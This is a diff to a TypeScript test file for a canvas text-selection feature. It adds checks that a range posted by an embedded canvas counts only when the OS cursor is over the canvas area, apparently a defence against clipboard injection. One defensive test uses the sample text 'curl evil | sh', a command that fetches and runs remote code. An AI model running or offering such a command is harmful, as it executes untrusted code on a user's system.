@@ -5296,7 +5296,11 @@ describe("canvas text", () => {
   type H = ReturnType<typeof selectionHarness>;
   const RECT = { x: 10, y: 20, width: 50, height: 18 };
   const harness = () => { const h = selectionHarness(); h.layout({ document: "doc" }); return h; };
-  const range = (h: H, over: Record<string, unknown> = {}) => h.receive({ type: "text-range", document: "doc", epoch: 0, dragging: false, rects: [RECT], text: "Copy me", ...over });
+  // The app checks the OS cursor (main's pointer reading, a promise) before it believes a new range; flush lets that
+  // reply land, with real or fake timers.
+  const flush = async () => { for (let i = 0; i < 6; i++) await Promise.resolve(); };
+  const post = (h: H, over: Record<string, unknown> = {}) => h.receive({ type: "text-range", document: "doc", epoch: 0, dragging: false, rects: [RECT], text: "Copy me", ...over });
+  const range = async (h: H, over: Record<string, unknown> = {}) => { post(h, over); await flush(); };
   const startDrag = (h: H, over: Record<string, unknown> = {}) => range(h, { dragging: true, text: undefined, ...over });
   const posted = (h: H) => h.current().contentWindow.postMessage.mock.calls.map(call => call[0] as Record<string, unknown>);
   const clears = (h: H) => posted(h).filter(m => m.type === "clear-text");
@@ -5320,10 +5324,10 @@ describe("canvas text", () => {
   const press = (h: H, code: string, over?: Record<string, unknown>) => { const event = keyEvent("keydown", code, over); h.host.dispatchEvent(event); return event; };
   const release = (h: H, code: string) => { const event = keyEvent("keyup", code); h.host.dispatchEvent(event); return event; };
 
-  it("paints one rect per line under the marks and copies the released text as plain text", () => {
+  it("paints one rect per line under the marks and copies the released text as plain text", async () => {
     const h = harness();
     try {
-      range(h, { rects: [RECT, { x: 10, y: 40, width: 30, height: 18 }] });
+      await range(h, { rects: [RECT, { x: 10, y: 40, width: 30, height: 18 }] });
       expect(painted(h)).toHaveLength(2);
       expect(painted(h)[0]!.style).toMatchObject({ left: "10px", top: "20px", width: "50px", height: "18px" });
       const { setData, event } = copy(h);
@@ -5332,10 +5336,10 @@ describe("canvas text", () => {
     } finally { h.controller.dispose(); }
   });
 
-  it("moves the painted range with the board's pan and zoom", () => {
+  it("moves the painted range with the board's pan and zoom", async () => {
     const h = harness();
     try {
-      range(h);
+      await range(h);
       const layer = h.markOf("text-range")!;
       h.controller.wheel({ dx: 10, dy: 20, ctrl: false, meta: false, deltaMode: 0 }, { x: 200, y: 100 });
       const view = h.controller.currentView();
@@ -5343,10 +5347,10 @@ describe("canvas text", () => {
     } finally { h.controller.dispose(); }
   });
 
-  it("leaves a copy event another handler took, and puts nothing off the canvas page or with a menu or dialog open", () => {
+  it("leaves a copy event another handler took, and puts nothing off the canvas page or with a menu or dialog open", async () => {
     const h = harness();
     try {
-      range(h);
+      await range(h);
       expect(copy(h, { prevented: true }).setData).not.toHaveBeenCalled();
       (h.doc as { querySelector: () => unknown }).querySelector = () => ({});
       expect(copied(h)).toBeNull();
@@ -5357,20 +5361,20 @@ describe("canvas text", () => {
     } finally { h.controller.dispose(); }
   });
 
-  it("copies nothing while dragging, before the text arrives", () => {
+  it("copies nothing while dragging, before the text arrives", async () => {
     const h = harness();
     try {
-      startDrag(h);
+      await startDrag(h);
       expect(painted(h)).toHaveLength(1);
       expect(copied(h)).toBeNull();
     } finally { h.controller.dispose(); }
   });
 
-  it("an empty rect list from the canvas (its next press) clears the range without a clear-text", () => {
+  it("an empty rect list from the canvas (its next press) clears the range without a clear-text", async () => {
     const h = harness();
     try {
-      range(h);
-      range(h, { rects: [], text: undefined });
+      await range(h);
+      await range(h, { rects: [], text: undefined });
       expect(painted(h)).toEqual([]);
       expect(copied(h)).toBeNull();
       expect(clears(h)).toEqual([]);
@@ -5399,10 +5403,10 @@ describe("canvas text", () => {
         h.host.dispatchEvent(event);
       }],
     ];
-    it.each(cases)("%s", (_name, act) => {
+    it.each(cases)("%s", async (_name, act) => {
       const h = harness();
       try {
-        range(h);
+        await range(h);
         act(h);
         expect(painted(h)).toEqual([]);
         expect(clears(h)).toEqual([{ type: "clear-text", epoch: 1 }]);
@@ -5416,10 +5420,10 @@ describe("canvas text", () => {
     });
   });
 
-  it("a collapsed caret moving in the app, as typing does, keeps it", () => {
+  it("a collapsed caret moving in the app, as typing does, keeps it", async () => {
     const h = harness();
     try {
-      range(h);
+      await range(h);
       Object.assign(h.host, { getSelection: () => ({ rangeCount: 1, isCollapsed: true }) });
       h.host.dispatchEvent(new Event("selectionchange"));
       expect(painted(h)).toHaveLength(1);
@@ -5434,10 +5438,10 @@ describe("canvas text", () => {
       ["switching to another canvas", h => { h.controller.openCanvas("/repo", h.other); }],
       ["closing the canvas", h => { h.controller.updateEntries([{ path: "/repo", kind: "list", servedRev: 0, canvases: [h.other] }]); }],
     ];
-    it.each(cases)("%s", (_name, act) => {
+    it.each(cases)("%s", async (_name, act) => {
       const h = harness();
       try {
-        range(h);
+        await range(h);
         act(h);
         expect(painted(h)).toEqual([]);
         expect(copied(h)).toBeNull();
@@ -5446,10 +5450,10 @@ describe("canvas text", () => {
   });
 
   describe("clears it when the board cannot be drawn", () => {
-    it("a row that loses its width (noWidth)", () => {
+    it("a row that loses its width (noWidth)", async () => {
       const h = harness();
       try {
-        range(h);
+        await range(h);
         h.controller.updateEntries([{ path: "/repo", kind: "list", servedRev: 1, canvases: [{ path: h.row.path, id: h.row.id, url: h.row.url }, h.other] }]);
         expect(h.state().status).toBe("noWidth");
         expect(painted(h)).toEqual([]);
@@ -5457,11 +5461,11 @@ describe("canvas text", () => {
       } finally { h.controller.dispose(); }
     });
 
-    it("a reload whose first layout never comes (failed)", () => {
+    it("a reload whose first layout never comes (failed)", async () => {
       vi.useFakeTimers();
       const h = harness();
       try {
-        range(h);
+        await range(h);
         h.controller.command("reload");
         vi.advanceTimersByTime(FIRST_LAYOUT_TIMEOUT_MS);
         expect(h.state().status).toBe("failed");
@@ -5471,10 +5475,10 @@ describe("canvas text", () => {
     });
   });
 
-  it("keeps it through Space, a wheel pan, a pinch and a zoom", () => {
+  it("keeps it through Space, a wheel pan, a pinch and a zoom", async () => {
     const h = harness();
     try {
-      range(h);
+      await range(h);
       press(h, "Space"); release(h, "Space");
       h.controller.wheel({ dx: 10, dy: 20, ctrl: false, meta: false, deltaMode: 0 }, { x: 200, y: 100 });
       h.controller.wheel({ dx: 0, dy: -5, ctrl: true, meta: false, deltaMode: 0 }, { x: 200, y: 100 });
@@ -5486,42 +5490,42 @@ describe("canvas text", () => {
     } finally { h.controller.dispose(); }
   });
 
-  it("drops a range older than the last clear, from another document, or sent during Hand, a pick or capture mode", () => {
+  it("drops a range older than the last clear, from another document, or sent during Hand, a pick or capture mode", async () => {
     const h = harness();
     try {
-      range(h);
+      await range(h);
       h.viewport.dispatchEvent(Object.assign(new Event("click"), { button: 0 }));
-      range(h, { epoch: 0 });
-      range(h, { epoch: 1, document: "old" });
+      await range(h, { epoch: 0 });
+      await range(h, { epoch: 1, document: "old" });
       expect(painted(h)).toEqual([]);
-      range(h, { epoch: 1 });
+      await range(h, { epoch: 1 });
       expect(painted(h)).toHaveLength(1);
       for (const [enter, leave] of [[() => h.controller.setTool("hand"), () => h.controller.setTool("select")], [() => h.controller.pick(), () => h.controller.cancelPick()], [() => h.controller.startCapture(), () => h.controller.cancelCapture()]] as const) {
         enter();
         const epoch = clears(h).at(-1)!.epoch;
-        range(h, { epoch });
+        await range(h, { epoch });
         expect(painted(h)).toEqual([]);
         leave();
       }
     } finally { h.controller.dispose(); }
   });
 
-  it("a new document starts its own epochs", () => {
+  it("a new document starts its own epochs", async () => {
     const h = harness();
     try {
-      range(h);
+      await range(h);
       h.viewport.dispatchEvent(Object.assign(new Event("click"), { button: 0 }));
       h.layout({ document: "doc2" });
-      range(h, { document: "doc2", epoch: 0 });
+      await range(h, { document: "doc2", epoch: 0 });
       expect(painted(h)).toHaveLength(1);
     } finally { h.controller.dispose(); }
   });
 
-  it("Esc clears the text first and keeps the element selection; the next Esc steps the selection back", () => {
+  it("Esc clears the text first and keeps the element selection; the next Esc steps the selection back", async () => {
     const h = harness();
     try {
       h.select(1);
-      range(h);
+      await range(h);
       expect(press(h, "Escape").defaultPrevented).toBe(true);
       expect(painted(h)).toEqual([]);
       expect(clears(h)).toHaveLength(1);
@@ -5532,10 +5536,10 @@ describe("canvas text", () => {
     } finally { h.controller.dispose(); }
   });
 
-  it("Esc in a text field keeps the canvas text", () => {
+  it("Esc in a text field keeps the canvas text", async () => {
     const h = harness();
     try {
-      range(h);
+      await range(h);
       const event = keyEvent("keydown", "Escape");
       Object.defineProperty(event, "target", { get: () => ({ tagName: "TEXTAREA", isContentEditable: false }) });
       h.host.dispatchEvent(event);
@@ -5544,55 +5548,55 @@ describe("canvas text", () => {
   });
 
   describe("during a drag", () => {
-    it("V, H and Space are ignored, and work again after the release", () => {
+    it("V, H and Space are ignored, and work again after the release", async () => {
       const h = harness();
       try {
-        startDrag(h);
+        await startDrag(h);
         expect(press(h, "KeyH").defaultPrevented).toBe(true);
         expect(press(h, "Space").defaultPrevented).toBe(true);
         release(h, "Space");
         h.receive({ type: "key", key: "H", seq: 0 });
         expect(h.state().tool).toBe("select");
         expect(h.layer.hidden).toBe(true);
-        range(h);
+        await range(h);
         press(h, "KeyH");
         expect(h.state().tool).toBe("hand");
       } finally { h.controller.dispose(); }
     });
 
-    it("Esc ends the drag and clears it", () => {
+    it("Esc ends the drag and clears it", async () => {
       const h = harness();
       try {
-        startDrag(h);
+        await startDrag(h);
         press(h, "Escape");
         expect(clears(h)).toHaveLength(1);
         expect(painted(h)).toEqual([]);
         // The canvas's release report, sent before the clear arrived, is dropped.
-        range(h);
+        await range(h);
         expect(painted(h)).toEqual([]);
       } finally { h.controller.dispose(); }
     });
 
-    it("the hover mark hides and comes back with the release", () => {
+    it("the hover mark hides and comes back with the release", async () => {
       const h = harness();
       try {
         h.receive({ type: "hover", seq: 0, rect: { x: 1, y: 2, width: 3, height: 4 } });
         expect(h.markOf("hover")?.hidden).toBe(false);
-        startDrag(h);
+        await startDrag(h);
         expect(h.markOf("hover")?.hidden).toBe(true);
-        range(h);
+        await range(h);
         expect(h.markOf("hover")?.hidden).toBe(false);
       } finally { h.controller.dispose(); }
     });
 
-    it("its start folds the app's own text selection", () => {
+    it("its start folds the app's own text selection", async () => {
       const h = harness();
       try {
         const selection = { rangeCount: 1, isCollapsed: false, collapseToEnd: vi.fn() };
         Object.assign(h.host, { getSelection: () => selection });
-        startDrag(h);
+        await startDrag(h);
         expect(selection.collapseToEnd).toHaveBeenCalledOnce();
-        range(h);
+        await range(h);
         expect(selection.collapseToEnd).toHaveBeenCalledOnce();
       } finally { h.controller.dispose(); }
     });
@@ -5600,19 +5604,21 @@ describe("canvas text", () => {
     it("the release moves keyboard focus to the canvas area as a click does", async () => {
       const h = harness();
       try {
-        startDrag(h);
-        expect(h.pointer).not.toHaveBeenCalled();
-        range(h);
+        await startDrag(h);
+        // The drag's start was checked against the cursor once; focus has not moved yet.
+        expect(h.pointer).toHaveBeenCalledOnce();
+        expect(h.viewport.focus).not.toHaveBeenCalled();
+        await range(h);
         await vi.waitFor(() => expect(h.viewport.focus).toHaveBeenCalledWith({ preventScroll: true, focusVisible: false }));
       } finally { h.controller.dispose(); }
     });
 
-    it("a wheel pan or pinch sends the pointer's new canvas point; outside a drag it sends none", () => {
+    it("a wheel pan or pinch sends the pointer's new canvas point; outside a drag it sends none", async () => {
       const h = harness();
       try {
         h.controller.wheel({ dx: 10, dy: 0, ctrl: false, meta: false, deltaMode: 0 }, { x: 200, y: 100 });
         expect(posted(h).filter(m => m.type === "text-point")).toEqual([]);
-        startDrag(h);
+        await startDrag(h);
         h.controller.wheel({ dx: 0, dy: 40, ctrl: false, meta: false, deltaMode: 0 }, { x: 200, y: 100 });
         const point = screenToBoard(h.controller.currentView(), { x: 200, y: 100 });
         expect(posted(h).filter(m => m.type === "text-point").at(-1)).toEqual({ type: "text-point", epoch: 0, x: point.x, y: point.y });
@@ -5621,7 +5627,7 @@ describe("canvas text", () => {
       } finally { h.controller.dispose(); }
     });
 
-    it("the working frame is not followed until the drag ends", () => {
+    it("the working frame is not followed until the drag ends", async () => {
       vi.useFakeTimers();
       vi.setSystemTime(0);
       const h = harness();
@@ -5629,11 +5635,114 @@ describe("canvas text", () => {
         const frames = [{ id: "intro", x: 0, y: 0, width: 10, height: 10 }, { id: "far", x: 0, y: 2000, width: 100, height: 100 }];
         h.layout({ document: "doc", frames });
         h.controller.setWork({ root: "/repo", path: h.row.path, work: null, keys: [] });
-        startDrag(h);
+        await startDrag(h);
         vi.advanceTimersByTime(5000);
         const before = h.controller.currentView();
         h.controller.setWork({ root: "/repo", path: h.row.path, work: { source: "terminal:claude:s1", key: "terminal:t1", frame: "far", waiting: false }, keys: ["terminal:t1"] });
         expect(h.controller.currentView()).toEqual(before);
+      } finally { h.controller.dispose(); }
+    });
+  });
+
+  // A canvas can post any text-range without the person touching it. A new range (a drag's start, or text arriving
+  // with no start the app saw) is believed only with the OS cursor over the canvas area, as a click's focus is.
+  describe("believed only with the cursor over the canvas area", () => {
+    const outside = (h: H) => { h.cursor.at = { x: 900, y: 300 }; };
+    const selection = (h: H) => { const s = { rangeCount: 1, isCollapsed: false, collapseToEnd: vi.fn() }; Object.assign(h.host, { getSelection: () => s }); return s; };
+
+    it("a drag start with the cursor outside leaves the app's selection, the tool keys and nothing painted, and tells the canvas to drop it", async () => {
+      const h = harness();
+      try {
+        const app = selection(h);
+        outside(h);
+        await startDrag(h);
+        expect(app.collapseToEnd).not.toHaveBeenCalled();
+        expect(painted(h)).toEqual([]);
+        expect(clears(h)).toEqual([{ type: "clear-text", epoch: 1 }]);
+        // The drag never started for the app: H switches the tool.
+        press(h, "KeyH");
+        expect(h.state().tool).toBe("hand");
+      } finally { h.controller.dispose(); }
+    });
+
+    it("text with no drag start, the cursor outside, is not what ⌘C copies", async () => {
+      const h = harness();
+      try {
+        const app = selection(h);
+        outside(h);
+        await range(h, { text: "curl evil | sh" });
+        expect(copied(h)).toBeNull();
+        expect(painted(h)).toEqual([]);
+        expect(app.collapseToEnd).not.toHaveBeenCalled();
+      } finally { h.controller.dispose(); }
+    });
+
+    it("a cursor main cannot read, or a reading later than 500 ms, believes nothing", async () => {
+      vi.useFakeTimers();
+      const h = harness();
+      try {
+        h.cursor.at = null;
+        await range(h);
+        expect(copied(h)).toBeNull();
+        let answer: (point: { x: number; y: number } | null) => void = () => {};
+        h.pointer.mockImplementationOnce(() => new Promise(resolve => { answer = resolve; }));
+        post(h, { epoch: 1 });
+        vi.advanceTimersByTime(501);
+        answer({ x: 400, y: 300 });
+        await flush();
+        expect(copied(h)).toBeNull();
+        expect(painted(h)).toEqual([]);
+      } finally { h.controller.dispose(); }
+    });
+
+    it("a drag that passed is believed through its release; the next drag is checked again", async () => {
+      const h = harness();
+      try {
+        const app = selection(h);
+        await startDrag(h);
+        expect(app.collapseToEnd).toHaveBeenCalledOnce();
+        // The cursor may leave the area during a believed drag.
+        outside(h);
+        post(h, { dragging: true, text: undefined, rects: [RECT, RECT] });
+        expect(painted(h)).toHaveLength(2);
+        post(h);
+        expect(copied(h)).toBe("Copy me");
+        // A layout refresh of the held range needs no check.
+        post(h, { text: undefined, rects: [RECT] });
+        expect(painted(h)).toHaveLength(1);
+        expect(copied(h)).toBe("Copy me");
+        // A new drag start, the cursor now outside: not believed, and the held range goes with it.
+        await startDrag(h);
+        expect(app.collapseToEnd).toHaveBeenCalledOnce();
+        expect(painted(h)).toEqual([]);
+        expect(copied(h)).toBeNull();
+        press(h, "KeyH");
+        expect(h.state().tool).toBe("hand");
+      } finally { h.controller.dispose(); }
+    });
+
+    it("a quick drag whose release comes before the cursor reply takes the released text once the reply passes", async () => {
+      const h = harness();
+      try {
+        const app = selection(h);
+        post(h, { dragging: true, text: undefined });
+        post(h, { text: "Quick" });
+        expect(copied(h)).toBeNull();
+        await flush();
+        expect(app.collapseToEnd).toHaveBeenCalledOnce();
+        expect(copied(h)).toBe("Quick");
+        expect(h.pointer).toHaveBeenCalledTimes(2);
+      } finally { h.controller.dispose(); }
+    });
+
+    it("a clear while the cursor reply is on its way drops the range that waited for it", async () => {
+      const h = harness();
+      try {
+        post(h);
+        h.viewport.dispatchEvent(Object.assign(new Event("click"), { button: 0 }));
+        await flush();
+        expect(painted(h)).toEqual([]);
+        expect(copied(h)).toBeNull();
       } finally { h.controller.dispose(); }
     });
   });
